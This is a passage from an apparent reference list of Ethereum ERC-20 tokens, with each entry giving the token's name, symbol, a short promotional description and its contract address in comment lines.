// KCS performs as the key to the entire KuCoin ecosystem, and it will also be the native asset on KuCoin’s decentralized financial services as well as the governance token of KuCoin Community.
// 0xf34960d9d60be18cc1d5afc1a6f012a723a28811

// Compound USD Coin (cUSDC)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x39aa39c021dfbae8fac545936693ac917d5e7563

// Pax Dollar (USDP)
// Pax Dollar (USDP) is a digital dollar redeemable one-to-one for US dollars and regulated by the New York Department of Financial Services.
// 0x8e870d67f660d95d5be530380d0ec0bd388289e1

// HuobiToken (HT)
// Huobi Global is a world-leading cryptocurrency financial services group.
// 0x6f259637dcd74c767781e37bc6133cd6a68aa161

// Huobi BTC (HBTC)
// HBTC is a standard ERC20 token backed by 100% BTC. While maintaining the equivalent value of Bitcoin, it also has the flexibility of Ethereum. A bridge between the centralized market and the DeFi market.
// 0x0316EB71485b0Ab14103307bf65a021042c6d380

// Maker (MKR)
// Maker is a Decentralized Autonomous Organization that creates and insures the dai stablecoin on the Ethereum blockchain
// 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2

// Graph Token (GRT)
// The Graph is an indexing protocol and global API for organizing blockchain data and making it easily accessible with GraphQL.
// 0xc944e90c64b2c07662a292be6244bdf05cda44a7

// BitTorrent (BTT)
// BTT is the official token of BitTorrent Chain, mapped from BitTorrent Chain at a ratio of 1:1. BitTorrent Chain is a brand-new heterogeneous cross-chain interoperability protocol, which leverages sidechains for the scaling of smart contracts.
// 0xc669928185dbce49d2230cc9b0979be6dc797957

// Decentralized USD (USDD)
// USDD is a fully decentralized over-collateralization stablecoin.
// 0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6

// Quant (QNT)
// Blockchain operating system that connects the world’s networks and facilitates the development of multi-chain applications.
// 0x4a220e6096b25eadb88358cb44068a3248254675

// Compound Dai (cDAI)
// Compound is an open-source, autonomous protocol built for developers, to unlock a universe of new financial applications. Interest and borrowing, for the open financial system.
// 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643

// Paxos Gold (PAXG)
// PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
// 0x45804880De22913dAFE09f4980848ECE6EcbAf78

// Compound Ether (cETH)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5

// Fantom Token (FTM)
// Fantom is a high-performance, scalable, customizable, and secure smart-contract platform. It is designed to overcome the limitations of previous generation blockchain platforms. Fantom is permissionless, decentralized, and open-source.
// 0x4e15361fd6b4bb609fa63c81a2be19d873717870

// Tether Gold (XAUt)
// Each XAU₮ token represents ownership of one troy fine ounce of physical gold on a specific gold bar. Furthermore, Tether Gold (XAU₮) is the only product among the competition that offers zero custody fees and has direct control over the physical gold storage.
// 0x68749665ff8d2d112fa859aa293f07a622782f38

// BitDAO (BIT)
// 0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5

// chiliZ (CHZ)
// Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
// 0x3506424f91fd33084466f402d5d97f05f8e3b4af

// BAT (BAT)
// The Basic Attention Token is the new token for the digital advertising industry.
// 0x0d8775f648430679a709e98d2b0cb6250d2887ef

// LoopringCoin V2 (LRC)
// Loopring is a DEX protocol offering orderbook-based trading infrastructure, zero-knowledge proof and an auction protocol called Oedax (Open-Ended Dutch Auction Exchange).
// 0xbbbbca6a901c926f240b89eacb641d8aec7aeafd

// Fei USD (FEI)
// Fei Protocol ($FEI) represents a direct incentive stablecoin which is undercollateralized and fully decentralized. FEI employs a stability mechanism known as direct incentives - dynamic mint rewards and burn penalties on DEX trade volume to maintain the peg.
// 0x956F47F50A910163D8BF957Cf5846D573E7f87CA

// Zilliqa (ZIL)
// Zilliqa is a high-throughput public blockchain platform - designed to scale to thousands ​of transactions per second.
// 0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27

// Amp (AMP)
// Amp is a digital collateral token designed to facilitate fast and efficient value transfer, especially for use cases that prioritize security and irreversibility. Using Amp as collateral, individuals and entities benefit from instant, verifiable assurances for any kind of asset exchange.
// 0xff20817765cb7f73d4bde2e66e067e58d11095c2

// Gala (GALA)
// Gala Games is dedicated to decentralizing the multi-billion dollar gaming industry by giving players access to their in-game items. Coming from the Co-founder of Zynga and some of the creative minds behind Farmville 2, Gala Games aims to revolutionize gaming.
// 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA

// EnjinCoin (ENJ)
// Customizable cryptocurrency and virtual goods platform for gaming.
// 0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c

// XinFin XDCE (XDCE)
// Hybrid Blockchain technology company focused on international trade and finance.
// 0x41ab1b6fcbb2fa9dced81acbdec13ea6315f2bf2

// Wrapped Celo (wCELO)
// Wrapped Celo is a 1:1 equivalent of Celo. Celo is a utility and governance asset for the Celo community, which has a fixed supply and variable value. With Celo, you can help shape the direction of the Celo Platform.
// 0xe452e6ea2ddeb012e20db73bf5d3863a3ac8d77a

// HoloToken (HOT)
// Holo is a decentralized hosting platform based on Holochain, designed to be a scalable development framework for distributed applications.
// 0x6c6ee5e31d828de241282b9606c8e98ea48526e2

// Synthetix Network Token (SNX)
// The Synthetix Network Token (SNX) is the native token of Synthetix, a synthetic asset (Synth) issuance protocol built on Ethereum. The SNX token is used as collateral to issue Synths, ERC-20 tokens that track the price of assets like Gold, Silver, Oil and Bitcoin.
// 0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f

// Nexo (NEXO)
// Instant Crypto-backed Loans
// 0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206

// HarmonyOne (ONE)
// A project to scale trust for billions of people and create a radically fair economy.
// 0x799a4202c12ca952cb311598a024c80ed371a41e

// 1INCH Token (1INCH)
// 1inch is a decentralized exchange aggregator that sources liquidity from various exchanges and is capable of splitting a single trade transaction across multiple DEXs. Smart contract technology empowers this aggregator enabling users to optimize and customize their trades.
// 0x111111111117dc0aa78b770fa6a738034120c302

// pTokens SAFEMOON (pSAFEMOON)
// Safemoon protocol aims to create a self-regenerating automatic liquidity providing protocol that would pay out static rewards to holders and penalize sellers.
// 0x16631e53c20fd2670027c6d53efe2642929b285c

// Frax Share (FXS)
// FXS is the value accrual and governance token of the entire Frax ecosystem. Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC.
// 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0

// Serum (SRM)
// Serum is a decentralized derivatives exchange with trustless cross-chain trading by Project Serum, in collaboration with a consortium of crypto trading and DeFi experts.
// 0x476c5E26a75bd202a9683ffD34359C0CC15be0fF

// WQtum (WQTUM)
// 0x3103df8f05c4d8af16fd22ae63e406b97fec6938

// Olympus (OHM)
// 0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5

// Gnosis (GNO)
// Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
// 0x6810e776880c02933d47db1b9fc05908e5386b96

// MCO (MCO)
// Crypto.com, the pioneering payments and cryptocurrency platform, seeks to accelerate the world’s transition to cryptocurrency.
// 0xb63b606ac810a52cca15e44bb630fd42d8d1d83d

// Gemini dollar (GUSD)
// Gemini dollar combines the creditworthiness and price stability of the U.S. dollar with blockchain technology and the oversight of U.S. regulators.
// 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd

// OMG Network (OMG)
// OmiseGO (OMG) is a public Ethereum-based financial technology for use in mainstream digital wallets
// 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07

// IOSToken (IOST)
// A Secure & Scalable Blockchain for Smart Services
// 0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab

// IoTeX Network (IOTX)
// IoTeX is the next generation of the IoT-oriented blockchain platform with vast scalability, privacy, isolatability, and developability. IoTeX connects the physical world, block by block.
// 0x6fb3e0a217407efff7ca062d46c26e5d60a14d69

// NXM (NXM)
// Nexus Mutual uses the power of Ethereum so people can share risks together without the need for an insurance company.
// 0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b

// ZRX (ZRX)
// 0x is an open, permissionless protocol allowing for tokens to be traded on the Ethereum blockchain.
// 0xe41d2489571d322189246dafa5ebde1f4699f498

// Celsius (CEL)
// A new way to earn, borrow, and pay on the blockchain.!
// 0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d

// Magic Internet Money (MIM)
// abracadabra.money is a lending protocol that allows users to borrow a USD-pegged Stablecoin (MIM) using interest-bearing tokens as collateral.
// 0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3

// Golem Network Token (GLM)
// Golem is going to create the first decentralized global market for computing power
// 0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429

// Compound (COMP)
// Compound governance token
// 0xc00e94cb662c3520282e6f5717214004a7f26888

// Lido DAO Token (LDO)
// Lido is a liquid staking solution for Ethereum. Lido lets users stake their ETH - with no minimum deposits or maintaining of infrastructure - whilst participating in on-chain activities, e.g. lending, to compound returns. LDO is an ERC20 token granting governance rights in the Lido DAO.
// 0x5a98fcbea516cf06857215779fd812ca3bef1b32

// HUSD (HUSD)
// HUSD is an ERC-20 token that is 1:1 ratio pegged with USD. It was issued by Stable Universal, an entity that follows US regulations.
// 0xdf574c24545e5ffecb9a659c229253d4111d87e1

// SushiToken (SUSHI)
// Be a DeFi Chef with Sushi - Swap, earn, stack yields, lend, borrow, leverage all on one decentralized, community driven platform.
// 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2

// Livepeer Token (LPT)
// A decentralized video streaming protocol that empowers developers to build video enabled applications backed by a competitive market of economically incentivized service providers.
// 0x58b6a8a3302369daec383334672404ee733ab239

// WAX Token (WAX)
// Global Decentralized Marketplace for Virtual Assets.
// 0x39bb259f66e1c59d5abef88375979b4d20d98022

// Swipe (SXP)
// Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
// 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9

// Ethereum Name Service (ENS)
// Decentralised naming for wallets, websites, & more.
// 0xc18360217d8f7ab5e7c516566761ea12ce7f9d72

// APENFT (NFT)
// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
// 0x198d14f2ad9ce69e76ea330b374de4957c3f850a

// UMA Voting Token v1 (UMA)
// UMA is a decentralized financial contracts platform built to enable Universal Market Access.
// 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828

// MXCToken (MXC)
// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
// 0x5ca381bbfb58f0092df149bd3d243b08b9a8386e

// SwissBorg (CHSB)
// Crypto Wealth Management.
// 0xba9d4199fab4f26efe3551d490e3821486f135ba

// Polymath (POLY)
// Polymath aims to enable securities to migrate to the blockchain.
// 0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec

// Wootrade Network (WOO)
// Wootrade is incubated by Kronos Research, which aims to solve the pain points of the diversified liquidity of the cryptocurrency market, and provides sufficient trading depth for users such as exchanges, wallets, and trading institutions with zero fees.
// 0x4691937a7508860f876c9c0a2a617e7d9e945d4b

// Dogelon (ELON)
// A universal currency for the people.
// 0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3

// yearn.finance (YFI)
// DeFi made simple.
// 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e

// PlatonCoin (PLTC)
// Platon Finance is a blockchain digital ecosystem that represents a bridge for all the people and business owners so everybody could learn, understand, use and benefit from blockchain, a revolution of technology. See the future in a new light with Platon.
// 0x429D83Bb0DCB8cdd5311e34680ADC8B12070a07f

// OriginToken (OGN)
// Origin Protocol is a platform for creating decentralized marketplaces on the blockchain.
// 0x8207c1ffc5b6804f6024322ccf34f29c3541ae26


// STASIS EURS Token (EURS)
// EURS token is a virtual financial asset that is designed to digitally mirror the EURO on the condition that its value is tied to the value of its collateral.
// 0xdb25f211ab05b1c97d595516f45794528a807ad8

// Smooth Love Potion (SLP)
// Smooth Love Potions (SLP) is a ERC-20 token that is fully tradable.
// 0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

// Balancer (BAL)
// Balancer is a n-dimensional automated market-maker that allows anyone to create or add liquidity to customizable pools and earn trading fees. Instead of the traditional constant product AMM model, Balancer’s formula is a generalization that allows any number of tokens in any weights or trading fees.
// 0xba100000625a3754423978a60c9317c58a424e3d

// renBTC (renBTC)
// renBTC is a one for one representation of BTC on Ethereum via RenVM.
// 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d

// Bancor (BNT)
// Bancor is an on-chain liquidity protocol that enables constant convertibility between tokens. Conversions using Bancor are executed against on-chain liquidity pools using automated market makers to price and process transactions without order books or counterparties.
// 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c

// Revain (REV)
// Revain is a blockchain-based review platform for the crypto community. Revain's ultimate goal is to provide high-quality reviews on all global products and services using emerging technologies like blockchain and AI.
// 0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9

// Rocket Pool (RPL)
// 0xd33526068d116ce69f19a9ee46f0bd304f21a51f

// Rocket Pool (RPL)
// Token contract has migrated to 0xD33526068D116cE69F19A9ee46F0bd304F21A51f
// 0xb4efd85c19999d84251304bda99e90b92300bd93

// Kyber Network Crystal v2 (KNC)
// Kyber is a blockchain-based liquidity protocol that aggregates liquidity from a wide range of reserves, powering instant and secure token exchange in any decentralized application.
// 0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202

// Iron Bank EUR (ibEUR)
// Fixed Forex is the collective name for USD, EUR, ZAR, JPY, CNY, AUD, AED, CAD, INR, and any other forex pairs launched under the Fixed Forex moniker.
// 0x96e61422b6a9ba0e068b6c5add4ffabc6a4aae27

// Synapse (SYN)
// Synapse is a cross-chain layer ∞ protocol powering interoperability between blockchains.
// 0x0f2d719407fdbeff09d87557abb7232601fd9f29

// XSGD (XSGD)
// StraitsX is the pioneering payments infrastructure for the digital assets space in Southeast Asia developed by Singapore-based FinTech Xfers Pte. Ltd, a Major Payment Institution licensed by the Monetary Authority of Singapore for e-money issuance
// 0x70e8de73ce538da2beed35d14187f6959a8eca96

// dYdX (DYDX)
// DYDX is a governance token that allows the dYdX community to truly govern the dYdX Layer 2 Protocol. By enabling shared control of the protocol, DYDX allows traders, liquidity providers, and partners of dYdX to work collectively towards an enhanced Protocol.
// 0x92d6c1e31e14520e676a687f0a93788b716beff5

// Reserve Rights (RSR)
// The fluctuating protocol token that plays a role in stabilizing RSV and confers the cryptographic right to purchase excess Reserve tokens as the network grows.
// 0x320623b8e4ff03373931769a31fc52a4e78b5d70

// Illuvium (ILV)
// Illuvium is a decentralized, NFT collection and auto battler game built on the Ethereum network.
// 0x767fe9edc9e0df98e07454847909b5e959d7ca0e

// CEEK (CEEK)
// Universal Currency for VR & Entertainment Industry. Working Product Partnered with NBA Teams, Universal Music and Apple
// 0xb056c38f6b7dc4064367403e26424cd2c60655e1

// Chroma (CHR)
// Chromia is a relational blockchain designed to make it much easier to make complex and scalable dapps.
// 0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2

// Telcoin (TEL)
// A cryptocurrency distributed by your mobile operator and accepted everywhere.
// 0x467Bccd9d29f223BcE8043b84E8C8B282827790F

// KEEP Token (KEEP)
// A keep is an off-chain container for private data.
// 0x85eee30c52b0b379b046fb0f85f4f3dc3009afec

// Pundi X Token (PUNDIX)
// To provide developers increased use cases and token user base by supporting offline and online payment of their custom tokens in Pundi X‘s ecosystem.
// 0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38

// PowerLedger (POWR)
// Power Ledger is a peer-to-peer marketplace for renewable energy.
// 0x595832f8fc6bf59c85c527fec3740a1b7a361269

// Render Token (RNDR)
// RNDR (Render Network) bridges GPUs across the world in order to provide much-needed power to artists, studios, and developers who rely on high-quality rendering to power their creations. The mission is to bridge the gap between GPU supply/demand through the use of distributed GPU computing.
// 0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24

// Storj (STORJ)
// Blockchain-based, end-to-end encrypted, distributed object storage, where only you have access to your data
// 0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac

// Synth sUSD (sUSD)
// A synthetic asset issued by the Synthetix protocol which tracks the price of the United States Dollar (USD). sUSD can be traded on Synthetix.Exchange for other synthetic assets through a peer-to-contract system with no slippage.
// 0x57ab1ec28d129707052df4df418d58a2d46d5f51

// BitMax token (BTMX)
// Digital asset trading platform
// 0xcca0c9c383076649604eE31b20248BC04FdF61cA

// DENT (DENT)
// Aims to disrupt the mobile operator industry by creating an open marketplace for buying and selling of mobile data.
// 0x3597bfd533a99c9aa083587b074434e61eb0a258

// FunFair (FUN)
// FunFair is a decentralised gaming platform powered by Ethereum smart contracts
// 0x419d0d8bdd9af5e606ae2232ed285aff190e711b

// XY Oracle (XYO)
// Blockchain's crypto-location oracle network
// 0x55296f69f40ea6d20e478533c15a6b08b654e758

// Metal (MTL)
// Transfer money instantly around the globe with nothing more than a phone number. Earn rewards every time you spend or make a purchase. Ditch the bank and go digital.
// 0xF433089366899D83a9f26A773D59ec7eCF30355e

// CelerToken (CELR)
// Celer Network is a layer-2 scaling platform that enables fast, easy and secure off-chain transactions.
// 0x4f9254c83eb525f9fcf346490bbb3ed28a81c667

// Ocean Token (OCEAN)
// Ocean Protocol helps developers build Web3 apps to publish, exchange and consume data.
// 0x967da4048cD07aB37855c090aAF366e4ce1b9F48

// Divi Exchange Token (DIVX)
// Digital Currency
// 0x13f11c9905a08ca76e3e853be63d4f0944326c72

// Tribe (TRIBE)
// 0xc7283b66eb1eb5fb86327f08e1b5816b0720212b

// ZEON (ZEON)
// ZEON Wallet provides a secure application that available for all major OS. Crypto-backed loans without checks.
// 0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532

// Rari Governance Token (RGT)
// The Rari Governance Token is the native token behind the DeFi robo-advisor, Rari Capital.
// 0xD291E7a03283640FDc51b121aC401383A46cC623

// Injective Token (INJ)
// Access, create and trade unlimited decentralized finance markets on an Ethereum-compatible exchange protocol for cross-chain DeFi.
// 0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30

// Energy Web Token Bridged (EWTB)
// Energy Web Token (EWT) is the native token of the Energy Web Chain, a public, Proof-of-Authority Ethereum Virtual Machine blockchain specifically designed to support enterprise-grade applications in the energy sector.
// 0x178c820f862b14f316509ec36b13123da19a6054

// MEDX TOKEN (MEDX)
// Decentralized healthcare information system
// 0xfd1e80508f243e64ce234ea88a5fd2827c71d4b7

// Spell Token (SPELL)
// Abracadabra.money is a lending platform that allows users to borrow funds using Interest Bearing Tokens as collateral.
// 0x090185f2135308bad17527004364ebcc2d37e5f6

// Uquid Coin (UQC)
// The goal of this blockchain asset is to supplement the development of UQUID Ecosystem. In this virtual revolution, coin holders will have the benefit of instantly and effortlessly cash out their coins.
// 0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2

// Mask Network (MASK)
// Mask Network allows users to encrypt content when posting on You-Know-Where and only the users and their friends can decrypt them.
// 0x69af81e73a73b40adf4f3d4223cd9b1ece623074

// Function X (FX)
// Function X is an ecosystem built entirely on and for the blockchain. It consists of five elements: f(x) OS, f(x) public blockchain, f(x) FXTP, f(x) docker and f(x) IPFS.
// 0x8c15ef5b4b21951d50e53e4fbda8298ffad25057

// Aragon Network Token (ANT)
// Create and manage unstoppable organizations. Aragon lets you manage entire organizations using the blockchain. This makes Aragon organizations more efficient than their traditional counterparties.
// 0xa117000000f279d81a1d3cc75430faa017fa5a2e

// KyberNetwork (KNC)
// KyberNetwork is a new system which allows the exchange and conversion of digital assets.
// 0xdd974d5c2e2928dea5f71b9825b8b646686bd200

// Origin Dollar (OUSD)
// Origin Dollar (OUSD) is a stablecoin that earns yield while it's still in your wallet. It was created by the team at Origin Protocol (OGN).
// 0x2a8e1e676ec238d8a992307b495b45b3feaa5e86

// QuarkChain Token (QKC)
// A High-Capacity Peer-to-Peer Transactional System
// 0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664

// Anyswap (ANY)
// Anyswap is a mpc decentralized cross-chain swap protocol.
// 0xf99d58e463a2e07e5692127302c20a191861b4d6

// Trace (TRAC)
// Purpose-built Protocol for Supply Chains Based on Blockchain.
// 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f

// ELF (ELF)
// elf is a decentralized self-evolving cloud computing blockchain network that aims to provide a high performance platform for commercial adoption of blockchain.
// 0xbf2179859fc6d5bee9bf9158632dc51678a4100e

// Request (REQ)
// A decentralized network built on top of Ethereum, which allows anyone, anywhere to request a payment.
// 0x8f8221afbb33998d8584a2b05749ba73c37a938a

// STPT (STPT)
// Decentralized Network for the Tokenization of any Asset.
// 0xde7d85157d9714eadf595045cc12ca4a5f3e2adb

// Ribbon (RBN)
// Ribbon uses financial engineering to create structured products that aim to deliver sustainable yield. Ribbon's first product focuses on yield through automated options strategies. The protocol also allows developers to create arbitrary structured products by combining various DeFi derivatives.
// 0x6123b0049f904d730db3c36a31167d9d4121fa6b

// HooToken (HOO)
// HooToken aims to provide safe and reliable assets management and blockchain services to users worldwide.
// 0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d

// Wrapped Celo USD (wCUSD)
// Wrapped Celo Dollars are a 1:1 equivalent of Celo Dollars. cUSD (Celo Dollars) is a stable asset that follows the US Dollar.
// 0xad3e3fc59dff318beceaab7d00eb4f68b1ecf195

// Dawn (DAWN)
// Dawn is a utility token to reward competitive gaming and help players to build their professional Esports careers.
// 0x580c8520deda0a441522aeae0f9f7a5f29629afa

// StormX (STMX)
// StormX is a gamified marketplace that enables users to earn STMX ERC-20 tokens by completing micro-tasks or shopping at global partner stores online. Users can earn staking rewards, shopping, and micro-task benefits for holding STMX in their own wallet.
// 0xbe9375c6a420d2eeb258962efb95551a5b722803

// BandToken (BAND)
// A data governance framework for Web3.0 applications operating as an open-source standard for the decentralized management of data. Band Protocol connects smart contracts with trusted off-chain information, provided through community-curated oracle data providers.
// 0xba11d00c5f74255f56a5e366f4f77f5a186d7f55

// NKN (NKN)
// NKN is the new kind of P2P network connectivity protocol & ecosystem powered by a novel public blockchain.
// 0x5cf04716ba20127f1e2297addcf4b5035000c9eb

// Reputation (REPv2)
// Augur combines the magic of prediction markets with the power of a decentralized network to create a stunningly accurate forecasting tool
// 0x221657776846890989a759ba2973e427dff5c9bb

// Alchemy (ACH)
// Alchemy Pay (ACH) is a Singapore-based payment solutions provider that provides online and offline merchants with secure, convenient fiat and crypto acceptance.
// 0xed04915c23f00a313a544955524eb7dbd823143d

// Orchid (OXT)
// Orchid enables a decentralized VPN.
// 0x4575f41308EC1483f3d399aa9a2826d74Da13Deb

// Fetch (FET)
// Fetch.ai is building tools and infrastructure to enable a decentralized digital economy by combining AI, multi-agent systems and advanced cryptography.
// 0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85

// Propy (PRO)
// Property Transactions Secured Through Blockchain.
// 0x226bb599a12c826476e3a771454697ea52e9e220

// Adshares (ADS)
// Adshares is a Web3 protocol for monetization space in the Metaverse. Adserver platforms allow users to rent space inside Metaverse, blockchain games, NFT exhibitions and websites.
// 0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a

// FLOKI (FLOKI)
// The Floki Inu protocol is a cross-chain community-driven token available on two blockchains: Ethereum (ETH) and Binance Smart Chain (BSC).
// 0xcf0c122c6b73ff809c693db761e7baebe62b6a2e

// Aurora (AURORA)
// Aurora is an EVM built on the NEAR Protocol, a solution for developers to operate their apps on an Ethereum-compatible, high-throughput, scalable and future-safe platform, with a fully trustless bridge architecture to connect Ethereum with other networks.
// 0xaaaaaa20d9e0e2461697782ef11675f668207961

// Token Prometeus Network (PROM)
// Prometeus Network fuels people-owned data markets, introducing new ways to interact with data and profit from it. They use a peer-to-peer approach to operate beyond any border or jurisdiction.
// 0xfc82bb4ba86045af6f327323a46e80412b91b27d

// Ankr Eth2 Reward Bearing Certificate (aETHc)
// Ankr's Eth2 staking solution provides the best user experience and highest level of safety, combined with an attractive reward mechanism and instant staking liquidity through a bond-like synthetic token called aETH.
// 0xE95A203B1a91a908F9B9CE46459d101078c2c3cb

// Numeraire (NMR)
// NMR is the scarcity token at the core of the Erasure Protocol. NMR cannot be minted and its core use is for staking and burning. The Erasure Protocol brings negative incentives to any website on the internet by providing users with economic skin in the game and punishing bad actors.
// 0x1776e1f26f98b1a5df9cd347953a26dd3cb46671

// RLC (RLC)
// Blockchain Based distributed cloud computing
// 0x607F4C5BB672230e8672085532f7e901544a7375

// Compound Basic Attention Token (cBAT)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e

// Bifrost (BFC)
// Bifrost is a multichain middleware platform that enables developers to create Decentralized Applications (DApps) on top of multiple protocols.
// 0x0c7D5ae016f806603CB1782bEa29AC69471CAb9c

// Boba Token (BOBA)
// Boba is an Ethereum L2 optimistic rollup that reduces gas fees, improves transaction throughput, and extends the capabilities of smart contracts through Hybrid Compute. Users of Boba’s native fast bridge can withdraw their funds in a few minutes instead of the usual 7 days required by other ORs.
// 0x42bbfa2e77757c645eeaad1655e0911a7553efbc

// AlphaToken (ALPHA)
// Alpha Finance Lab is an ecosystem of DeFi products and focused on building an ecosystem of automated yield-maximizing Alpha products that interoperate to bring optimal alpha to users on a cross-chain level.
// 0xa1faa113cbe53436df28ff0aee54275c13b40975

// SingularityNET Token (AGIX)
// Decentralized marketplace for artificial intelligence.
// 0x5b7533812759b45c2b44c19e320ba2cd2681b542

// Dusk Network (DUSK)
// Dusk streamlines the issuance of digital securities and automates trading compliance with the programmable and confidential securities.
// 0x940a2db1b7008b6c776d4faaca729d6d4a4aa551

// CocosToken (COCOS)
// The platform for the next generation of digital game economy.
// 0x0c6f5f7d555e7518f6841a79436bd2b1eef03381

// Beta Token (BETA)
// Beta Finance is a cross-chain permissionless money market protocol for lending, borrowing, and shorting crypto. Beta Finance has created an integrated “1-Click” Short Tool to initiate, manage, and close short positions, as well as allow anyone to create money markets for a token automatically.
// 0xbe1a001fe942f96eea22ba08783140b9dcc09d28

// USDK (USDK)
// USDK-Stablecoin Powered by Blockchain and US Licenced Trust Company
// 0x1c48f86ae57291f7686349f12601910bd8d470bb

// Veritaseum (VERI)
// Veritaseum builds blockchain-based, peer-to-peer capital markets as software on a global scale.
// 0x8f3470A7388c05eE4e7AF3d01D8C722b0FF52374

// mStable USD (mUSD)
// The mStable Standard is a protocol with the goal of making stablecoins and other tokenized assets easy, robust, and profitable.
// 0xe2f2a5c287993345a840db3b0845fbc70f5935a5

// Marlin POND (POND)
// Marlin is an open protocol that provides a high-performance programmable network infrastructure for Web 3.0
// 0x57b946008913b82e4df85f501cbaed910e58d26c

// Automata (ATA)
// Automata is a privacy middleware layer for dApps across multiple blockchains, built on a decentralized service protocol.
// 0xa2120b9e674d3fc3875f415a7df52e382f141225

// TrueFi (TRU)
// TrueFi is a DeFi protocol for uncollateralized lending powered by the TRU token. TRU Stakers to assess the creditworthiness of the loans
// 0x4c19596f5aaff459fa38b0f7ed92f11ae6543784

// Rupiah Token (IDRT)
// Rupiah Token (IDRT) is the first fiat-collateralized Indonesian Rupiah Stablecoin. Developed by PT Rupiah Token Indonesia, each IDRT is worth exactly 1 IDR.
// 0x998FFE1E43fAcffb941dc337dD0468d52bA5b48A

// Aergo (AERGO)
// Aergo is an open platform that allows businesses to build innovative applications and services by sharing data on a trustless and distributed IT ecosystem.
// 0x91Af0fBB28ABA7E31403Cb457106Ce79397FD4E6

// DODO bird (DODO)
// DODO is a on-chain liquidity provider, which leverages the Proactive Market Maker algorithm (PMM) to provide pure on-chain and contract-fillable liquidity for everyone.
// 0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd

// Keep3rV1 (KP3R)
// Keep3r Network is a decentralized keeper network for projects that need external devops and for external teams to find keeper jobs.
// 0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44

// ALICE (ALICE)
// My Neighbor Alice is a multiplayer builder game, where anyone can buy and own virtual islands, collect and build items and meet new friends.
// 0xac51066d7bec65dc4589368da368b212745d63e8

// Litentry (LIT)
// Litentry is a Decentralized Identity Aggregator that enables linking user identities across multiple networks.
// 0xb59490ab09a0f526cc7305822ac65f2ab12f9723

// Covalent Query Token (CQT)
// Covalent aggregates information from across dozens of sources including nodes, chains, and data feeds. Covalent returns this data in a rapid and consistent manner, incorporating all relevant data within one API interface.
// 0xd417144312dbf50465b1c641d016962017ef6240

// BitMartToken (BMC)
// BitMart is a globally integrated trading platform founded by a group of cryptocurrency enthusiasts.
// 0x986EE2B944c42D017F52Af21c4c69B84DBeA35d8

// Proton (XPR)
// Proton is a new public blockchain and dApp platform designed for both consumer applications and P2P payments. It is built around a secure identity and financial settlements layer that allows users to directly link real identity and fiat accounts, pull funds and buy crypto, and use crypto seamlessly.
// 0xD7EFB00d12C2c13131FD319336Fdf952525dA2af

// Aurora DAO (AURA)
// Aurora is a collection of Ethereum applications and protocols that together form a decentralized banking and finance platform.
// 0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814

// CarryToken (CRE)
// Carry makes personal data fair for consumers, marketers and merchants
// 0x115ec79f1de567ec68b7ae7eda501b406626478e

// LCX (LCX)
// LCX Terminal is made for Professional Cryptocurrency Portfolio Management
// 0x037a54aab062628c9bbae1fdb1583c195585fe41

// Gitcoin (GTC)
// GTC is a governance token with no economic value. GTC governs Gitcoin, where they work to decentralize grants, manage disputes, and govern the treasury.
// 0xde30da39c46104798bb5aa3fe8b9e0e1f348163f

// BOX Token (BOX)
